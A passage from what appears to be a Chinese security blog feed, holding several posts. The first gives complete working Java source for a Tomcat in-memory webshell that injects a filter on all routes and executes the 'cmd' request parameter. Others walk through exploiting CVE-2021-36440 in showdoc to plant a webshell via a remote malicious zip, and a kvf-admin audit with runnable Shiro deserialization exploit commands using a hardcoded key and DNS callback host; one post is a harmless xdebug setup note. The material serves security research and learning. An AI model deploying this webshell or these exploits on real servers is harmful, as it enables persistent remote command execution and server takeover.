&#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        <span class="comment">//在doFilter中写了我们命令执行逻辑,获取cmd参数并且执行输出回显</span></span><br><span class="line">        HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class="line">        <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="keyword">null</span>)&#123;</span><br><span class="line">            InputStream in = Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">            Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            String output = s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            servletResponse.getWriter().write(output);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//注入FilterDef</span></span><br><span class="line">Class&lt;?&gt; FilterDef = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);</span><br><span class="line">Constructor declaredConstructors = FilterDef.getDeclaredConstructor();</span><br><span class="line">org.apache.tomcat.util.descriptor.web.FilterDef o = (FilterDef)declaredConstructors.newInstance();</span><br><span class="line">o.setFilter(filter);<span class="comment">//将我们刚刚new的filter设置进去</span></span><br><span class="line">o.setFilterName(FilterName);<span class="comment">//设置filername</span></span><br><span class="line">o.setFilterClass(filter.getClass().getName());<span class="comment">//设置filter所对应的类</span></span><br><span class="line">standardContext.addFilterDef(o);<span class="comment">//将FilterDef添加到standardContext中</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//注入filterConfigs</span></span><br><span class="line">Class&lt;?&gt; ApplicationFilterConfig = Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);<span class="comment">//获取ApplicationFilterConfig构造函数</span></span><br><span class="line">declaredConstructor1.setAccessible(<span class="keyword">true</span>);<span class="comment">//设置其可访问性</span></span><br><span class="line">ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);<span class="comment">//实例化filterConfig</span></span><br><span class="line">filterConfigs.put(FilterName,filterConfig);<span class="comment">//将filterConfig放入filterConfigs</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//注入filterMaps</span></span><br><span class="line">Class&lt;?&gt; FilterMap = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();</span><br><span class="line">org.apache.tomcat.util.descriptor.web.FilterMap o1 = (org.apache.tomcat.util.descriptor.web.FilterMap)declaredConstructor.newInstance();</span><br><span class="line">o1.addURLPattern(<span class="string">&quot;/*&quot;</span>);<span class="comment">//设置filter作用路由,此处是对所有路由生效</span></span><br><span class="line">o1.setFilterName(FilterName);<span class="comment">//设置filterName</span></span><br><span class="line">o1.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">standardContext.addFilterMapBefore(o1);<span class="comment">//添加到standardContext中</span></span><br><span class="line"></span><br><span class="line">servletResponse.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>至此,我们动态添加Filter的工作就完成了,完整代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebFilter(filterName = &quot;three&quot;,value = &quot;/create_eval_filter&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span>  </span>&#123;</span><br><span class="line">        ServletContext servletContext = servletRequest.getServletContext();</span><br><span class="line">        Field appctx = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            appctx = servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            appctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);</span><br><span class="line">            Field stdctx = applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            stdctx.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);</span><br><span class="line">            String FilterName = <span class="string">&quot;cmd_Filter&quot;</span>;</span><br><span class="line">            Field Configs = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            Configs.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Map filterConfigs = <span class="keyword">null</span>;</span><br><span class="line">            filterConfigs = (Map) Configs.get(standardContext);</span><br><span class="line"><span class="comment">//            定义一个Filter</span></span><br><span class="line">            Filter filter = <span class="keyword">new</span> Filter() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">                    HttpServletRequest req = (HttpServletRequest) servletRequest;</span><br><span class="line">                    <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="keyword">null</span>)&#123;</span><br><span class="line">                        InputStream in = Runtime.getRuntime().exec(req.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line">                        Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                        String output = s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                        servletResponse.getWriter().write(output);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"><span class="comment">//            自定义FilterDef并且将其加入standardContext</span></span><br><span class="line">            Class&lt;?&gt; FilterDef = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span>);</span><br><span class="line">            Constructor declaredConstructors = FilterDef.getDeclaredConstructor();</span><br><span class="line">            org.apache.tomcat.util.descriptor.web.FilterDef o = (FilterDef) declaredConstructors.newInstance();</span><br><span class="line">            o.setFilter(filter);</span><br><span class="line">            o.setFilterName(FilterName);</span><br><span class="line">            o.setFilterClass(filter.getClass().getName());</span><br><span class="line">            standardContext.addFilterDef(o);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//自定义filterConfigs并且将其加入standardContext</span></span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; ApplicationFilterConfig = Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterConfig&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; declaredConstructor1 = ApplicationFilterConfig.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">            declaredConstructor1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            ApplicationFilterConfig filterConfig = (org.apache.catalina.core.ApplicationFilterConfig) declaredConstructor1.newInstance(standardContext,o);</span><br><span class="line">            filterConfigs.put(FilterName,filterConfig);</span><br><span class="line">            servletResponse.getWriter().write(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Class&lt;?&gt; FilterMap = Class.forName(<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span>);</span><br><span class="line">            Constructor&lt;?&gt; declaredConstructor = FilterMap.getDeclaredConstructor();</span><br><span class="line">            org.apache.tomcat.util.descriptor.web.FilterMap o1 = (org.apache.tomcat.util.descriptor.web.FilterMap)declaredConstructor.newInstance();</span><br><span class="line">            o1.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">            o1.setFilterName(FilterName);</span><br><span class="line">            o1.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">            standardContext.addFilterMapBefore(o1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            System.out.println(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们启动项目，首先访问/create_eval_filter,提示注入成功</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221027100351365.png" class title="image-20221027100351365"><p>然后向任意路由传参即可使用命令执行</p><img src="/2022/10/15/Java%E5%85%B3%E4%BA%8E%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/image-20221027100431363.png" class title="image-20221027100431363">]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;0X01&quot;&gt;&lt;a href=&quot;#0X01&quot; class=&quot;headerlink&quot; title=&quot;0X01&quot;&gt;&lt;/a&gt;0X01&lt;/h3&gt;&lt;p&gt;关于java内存马有关的知识网络上有不少的分析文章,但是个人在学习的过程中觉得分析的不够详尽细致,作为第一次研究的读者可能有</summary>
      
    
    
    
    
    <category term="java安全" scheme="https://men9da.cn/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-36440分析</title>
    <link href="https://men9da.cn/2022/09/08/CVE-2021-36440%E5%88%86%E6%9E%90/"/>
    <id>https://men9da.cn/2022/09/08/CVE-2021-36440%E5%88%86%E6%9E%90/</id>
    <published>2022-09-07T16:29:42.000Z</published>
    <updated>2022-09-07T17:28:02.709Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-36440-未授权任意文件上传"><a href="#CVE-2021-36440-未授权任意文件上传" class="headerlink" title="CVE-2021-36440(未授权任意文件上传)"></a>CVE-2021-36440(未授权任意文件上传)</h1><p>该漏洞出自产品showdoc</p><h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>根据github提交记录分析影响版本为</p><p>未授权:2.9.4-2.9.5</p><p>授权后的任意文件上传:2.9.6-2.10.3</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>该漏洞出来自</p><p>/server/Application/Api/Controller/AdminUpdateController.class.php中</p><p>关注到download方法</p><p>该方法中处有三个可控参数,分别是</p><p>$new_version:由用户直接传参(new_version)</p><p>$title_url:由用户直接传参(file_url)</p><p>$version_num:去掉$new_version中的v</p><img src="/2022/09/08/CVE-2021-36440%E5%88%86%E6%9E%90/image-20220908003306076.png" class title="image-20220908003306076"><p>继续往下分析</p><p>在52行处file_get_contents可以下载远程服务器上的恶意文件,此时$file_url的参数为:</p><p><a href="http://192.168.1.106:81/showdoc-666.zip%E4%B8%8B%E8%BD%BD%E5%88%B0%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%86%85%E5%AE%B9%E5%90%8E%E5%B0%86%E5%85%B6%E5%86%99%E5%85%A5$zip_file%E4%B8%AD">http://192.168.1.106:81/showdoc-666.zip下载到远程文件内容后将其写入$zip_file中</a></p><img src="/2022/09/08/CVE-2021-36440%E5%88%86%E6%9E%90/image-20220908003656745.png" class title="image-20220908003656745"><p>然后压缩包会被解压到$temp_dir也就是/tmp/showdoc_update/中</p><img src="/2022/09/08/CVE-2021-36440%E5%88%86%E6%9E%90/image-20220908004231787.png" class title="image-20220908004231787"><p>然后会判断压缩包内文件是否符合要求,如果符合要求就会将压缩包内的文件写入</p><p>/var/www/html/Public/Uploads/upadte/</p><img src="/2022/09/08/CVE-2021-36440%E5%88%86%E6%9E%90/image-20220908004321006.png" class title="image-20220908004321006"><p>此处判断的条件是如下三个文件是否存在</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$zip_file_subpath.&#39;composer.json&#39;</span><br><span class="line">$zip_file_subpath.&#39;web&#x2F;index.php&#39;</span><br><span class="line">$zip_file_subpath.&#39;server&#x2F;vendor&#x2F;autoload.php&#39;</span><br></pre></td></tr></table></figure><p>而$zip_file_subpath的生成规则则是/tmp/showdoc_update/showdoc-$version_num/</p><p>而此处的$version_num是可控的</p><img src="/2022/09/08/CVE-2021-36440%E5%88%86%E6%9E%90/image-20220908004555170.png" class title="image-20220908004555170"><p>于是我们的压缩包内容只要满足如下层级即可满足条件,此处的1.php是我们的木马</p><img src="/2022/09/08/CVE-2021-36440%E5%88%86%E6%9E%90/image-20220908005050150.png" class title="image-20220908005050150"><p>上传恶意压缩包,web根目录生成木马</p><img src="/2022/09/08/CVE-2021-36440%E5%88%86%E6%9E%90/image-20220908005159437.png" class title="image-20220908005159437"><p>成功访问</p><img src="/2022/09/08/CVE-2021-36440%E5%88%86%E6%9E%90/image-20220908005230422.png" class title="image-20220908005230422"><h3 id="全版本更新分析"><a href="#全版本更新分析" class="headerlink" title="全版本更新分析"></a>全版本更新分析</h3><p>该功能在2.9.4版本发布,到2.9.6之前都是未授权文件上传</p><p>从2.9.6开始,作者增加了权限验证,但是文件上传仍然还是存在的,只不过由未授权变成了需要管理员权限</p><img src="/2022/09/08/CVE-2021-36440%E5%88%86%E6%9E%90/image-20220908011137085.png" class title="image-20220908011137085"><p>直到2.10.4,作者才彻底修复了这一版本的漏洞</p><p>作者搭建了自己的更新服务器,从而导致file_url不在可控了</p><img src="/2022/09/08/CVE-2021-36440%E5%88%86%E6%9E%90/image-20220908011306723.png" class title="image-20220908011306723">]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CVE-2021-36440-未授权任意文件上传&quot;&gt;&lt;a href=&quot;#CVE-2021-36440-未授权任意文件上传&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-36440(未授权任意文件上传)&quot;&gt;&lt;/a&gt;CVE-2021-3644</summary>
      
    
    
    
    
    <category term="php代码审计" scheme="https://men9da.cn/tags/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>远程PHP调试大坑</title>
    <link href="https://men9da.cn/2022/09/07/%E8%BF%9C%E7%A8%8BPHP%E8%B0%83%E8%AF%95%E5%A4%A7%E5%9D%91/"/>
    <id>https://men9da.cn/2022/09/07/%E8%BF%9C%E7%A8%8BPHP%E8%B0%83%E8%AF%95%E5%A4%A7%E5%9D%91/</id>
    <published>2022-09-07T15:25:58.000Z</published>
    <updated>2022-09-07T15:36:40.605Z</updated>
    
    <content type="html"><![CDATA[<p>今天在调试docker内部的php代码的时候遇到了究极大坑,折腾了快3个小时,随记录</p><p>php远程调试配置过程,这些步骤在网上都能搜得到</p><p>在<a href="https://xdebug.org/docs/install#linux%E7%9C%8B%E5%A6%82%E4%BD%95%E5%AE%89%E8%A3%85%E5%AF%B9%E5%BA%94%E7%9A%84xdebug">https://xdebug.org/docs/install#linux看如何安装对应的xdebug</a></p><p>这里运行对应的命令即可</p><img src="/2022/09/07/%E8%BF%9C%E7%A8%8BPHP%E8%B0%83%E8%AF%95%E5%A4%A7%E5%9D%91/image-20220907232835003.png" class title="image-20220907232835003"><p>运行完这里的命令会生成xdebug.so文件,具体在哪儿请搜索</p><p>完成后需要在php.ini中加入<img src="/2022/09/07/%E8%BF%9C%E7%A8%8BPHP%E8%B0%83%E8%AF%95%E5%A4%A7%E5%9D%91/image-20220907232939886.png" class title="image-20220907232939886"></p><p>然后运行php -v .xdebug看看是否加载成功，出现如下及成功,如果这一步骤有问题,会在此处显示错误信息,根据具体错误信息百度能瞬间接解决,请跟着百度解决直到出现如下样子</p><img src="/2022/09/07/%E8%BF%9C%E7%A8%8BPHP%E8%B0%83%E8%AF%95%E5%A4%A7%E5%9D%91/image-20220907233030659.png" class title="image-20220907233030659"><p><strong>接下来才是重头戏,也是巨坑,巨容易出错的地方</strong></p><p>配php.ini,注意，此处需要判断是xdebug2还是xdebug3,我这里用的是xdebug3的配置</p><p>箭头标注的地方是巨坑,如果是调试docker里面的,这个地方千万不能写127.0.0.1,会完全无法debug,</p><p>还有一点注意的是,client_port是docker和宿主机通讯的端口,<strong>docker无需开放映射</strong>，然后就是idekey配置为PHPSTORM即可</p><img src="/2022/09/07/%E8%BF%9C%E7%A8%8BPHP%E8%B0%83%E8%AF%95%E5%A4%A7%E5%9D%91/image-20220907233318503.png" class title="image-20220907233318503"><p><strong>巨坑过了,接下来配置phpstorm也有坑点</strong></p><p>配置点1，需要和php.ini中的配置一样</p><img src="/2022/09/07/%E8%BF%9C%E7%A8%8BPHP%E8%B0%83%E8%AF%95%E5%A4%A7%E5%9D%91/image-20220907233454045.png" class title="image-20220907233454045"><p>配置点2需要和php.ini中的配置一样</p><img src="/2022/09/07/%E8%BF%9C%E7%A8%8BPHP%E8%B0%83%E8%AF%95%E5%A4%A7%E5%9D%91/image-20220907233539562.png" class title="image-20220907233539562"><p>配置点3</p><p>注意这个地方要填两个路径,一个是本地代码路径,一个是服务器上跑的代码路径(WEB根目录)</p><img src="/2022/09/07/%E8%BF%9C%E7%A8%8BPHP%E8%B0%83%E8%AF%95%E5%A4%A7%E5%9D%91/image-20220907233615898.png" class title="image-20220907233615898"><p>配置完成后即可开始debug</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;今天在调试docker内部的php代码的时候遇到了究极大坑,折腾了快3个小时,随记录&lt;/p&gt;
&lt;p&gt;php远程调试配置过程,这些步骤在网上都能搜得到&lt;/p&gt;
&lt;p&gt;在&lt;a href=&quot;https://xdebug.org/docs/install#linux%E7%9C%8</summary>
      
    
    
    
    
    <category term="-php远程调试" scheme="https://men9da.cn/tags/php%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>记一次SpringBoot审计(一)</title>
    <link href="https://men9da.cn/2022/07/23/%E8%AE%B0%E4%B8%80%E6%AC%A1SpringBoot%E5%AE%A1%E8%AE%A1-%E4%B8%80/"/>
    <id>https://men9da.cn/2022/07/23/%E8%AE%B0%E4%B8%80%E6%AC%A1SpringBoot%E5%AE%A1%E8%AE%A1-%E4%B8%80/</id>
    <published>2022-07-23T10:09:11.000Z</published>
    <updated>2022-07-23T17:59:30.779Z</updated>
    
    <content type="html"><![CDATA[<p>初学SpringBoot框架，找了个开源项目练习一下学到的审计技巧，这次审计的是github上的一个开源OA项目，项目地址：<a href="https://github.com/kalvinGit/kvf-admin%EF%BC%8C%E9%A1%B9%E7%9B%AE%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8maven%E4%B8%80%E9%94%AE%E6%90%AD%E5%BB%BA%EF%BC%8C%E6%B2%A1%E4%BB%80%E4%B9%88%E5%A5%BD%E8%AF%B4%E7%9A%84%EF%BC%8C%E7%9B%B4%E6%8E%A5%E5%BC%80%E5%AE%A1">https://github.com/kalvinGit/kvf-admin，项目直接使用maven一键搭建，没什么好说的，直接开审</a></p><h1 id="1-常规sql注入检查"><a href="#1-常规sql注入检查" class="headerlink" title="1.常规sql注入检查"></a>1.常规sql注入检查</h1><p>找到mybatis的mappre配置文件</p><img src="/2022/07/23/%E8%AE%B0%E4%B8%80%E6%AC%A1SpringBoot%E5%AE%A1%E8%AE%A1-%E4%B8%80/image-20220723181251301.png" class title="image-20220723181251301"><p>在mapper文件夹内搜索$符号看看是否存在未使用预编译的sql语句，只找到一处，我们跟进看看</p><img src="/2022/07/23/%E8%AE%B0%E4%B8%80%E6%AC%A1SpringBoot%E5%AE%A1%E8%AE%A1-%E4%B8%80/image-20220723181350190.png" class title="image-20220723181350190"><p>位于selectPermission方法</p><img src="/2022/07/23/%E8%AE%B0%E4%B8%80%E6%AC%A1SpringBoot%E5%AE%A1%E8%AE%A1-%E4%B8%80/image-20220723181426554.png" class title="image-20220723181426554"><p>该函数只有一个用法，在MenuServiceImpl类中的getPermission方法中调用</p><img src="/2022/07/23/%E8%AE%B0%E4%B8%80%E6%AC%A1SpringBoot%E5%AE%A1%E8%AE%A1-%E4%B8%80/image-20220723181532187.png" class title="image-20220723181532187"><p>getPermission，发现是在shiro授权中调用的,而且userId看似也不可控，无奈放弃</p><img src="/2022/07/23/%E8%AE%B0%E4%B8%80%E6%AC%A1SpringBoot%E5%AE%A1%E8%AE%A1-%E4%B8%80/image-20220723181642697.png" class title="image-20220723181642697"><h1 id="2-越权检查"><a href="#2-越权检查" class="headerlink" title="2.越权检查"></a>2.越权检查</h1><p>此项目采用shiro做权限管理，定位到shiro配置</p><p>可以看到除了少数的几个</p><p>/static/    /login/    /duird/    /captcha是anon权限，除了上述的路由其他的所有路由都设置为了authc过滤器，authc过滤器是shiro自带的一个过滤器用于检测用户是否登录，如果没有登录将会跳转到设置的登录页面,这里是跳转到/login</p><img src="/2022/07/23/%E8%AE%B0%E4%B8%80%E6%AC%A1SpringBoot%E5%AE%A1%E8%AE%A1-%E4%B8%80/image-20220723183813734.png" class title="image-20220723183813734"><h1 id="3-任意文件上传"><a href="#3-任意文件上传" class="headerlink" title="3.任意文件上传"></a>3.任意文件上传</h1><p>在路由/common/fileUpload处存在文件上传接口</p><img src="/2022/07/23/%E8%AE%B0%E4%B8%80%E6%AC%A1SpringBoot%E5%AE%A1%E8%AE%A1-%E4%B8%80/image-20220723185359788.png" class title="image-20220723185359788"><p>可以看到此处接受了file，type参数,并且type参数必须为UploadPathEnum中定义的类型，type参数决定了文件上传的目录</p><img src="/2022/07/23/%E8%AE%B0%E4%B8%80%E6%AC%A1SpringBoot%E5%AE%A1%E8%AE%A1-%E4%B8%80/image-20220723185459267.png" class title="image-20220723185459267"><p>此处没有任何过滤所以存在文件上传漏洞，我们构造请求页面发起请求，可以看到当type参数为file时会上传到file/目录下</p><img src="/2022/07/23/%E8%AE%B0%E4%B8%80%E6%AC%A1SpringBoot%E5%AE%A1%E8%AE%A1-%E4%B8%80/image-20220723185639036.png" class title="image-20220723185639036"><p>同时,当file参数为image时会上传到image目录下</p><img src="/2022/07/23/%E8%AE%B0%E4%B8%80%E6%AC%A1SpringBoot%E5%AE%A1%E8%AE%A1-%E4%B8%80/image-20220723185744896.png" class title="image-20220723185744896"><h1 id="4-Shiro反序列化"><a href="#4-Shiro反序列化" class="headerlink" title="4.Shiro反序列化"></a>4.Shiro反序列化</h1><p>在shiro的config中我们明显地看到了硬编码,使用此应用的人如果没有及时更换密钥那么就会造成反序列化漏洞</p><img src="/2022/07/23/%E8%AE%B0%E4%B8%80%E6%AC%A1SpringBoot%E5%AE%A1%E8%AE%A1-%E4%B8%80/image-20220724013412445.png" class title="image-20220724013412445"><p>此项目shiro版本为1.6，在shiro1.4.2后使用GCM加密方法,将反序列化payload使用GCM加密方法后攻击即可</p><p>URLDNS探测</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro-exploit.py yso -g URLDNS -c &quot;http:&#x2F;&#x2F;4d43e338.toxiclog.xyz&quot; -u http:&#x2F;&#x2F;127.0.0.1:8080 -k 2AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D; -v2</span><br></pre></td></tr></table></figure><img src="/2022/07/23/%E8%AE%B0%E4%B8%80%E6%AC%A1SpringBoot%E5%AE%A1%E8%AE%A1-%E4%B8%80/image-20220724013643564.png" class title="image-20220724013643564"><p>由于本项目没有CC依赖，所以我们用shiro无依赖打，利用CommonsBeanutils1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python shiro-exploit.py yso -g CommonsBeanutils1 -c &quot;calc&quot; -u http:&#x2F;&#x2F;127.0.0.1:8080 -k 2AvVhdsgUs0FSA3SDFAdag&#x3D;&#x3D; -v 2</span><br></pre></td></tr></table></figure><img src="/2022/07/23/%E8%AE%B0%E4%B8%80%E6%AC%A1SpringBoot%E5%AE%A1%E8%AE%A1-%E4%B8%80/image-20220724015754541.png" class 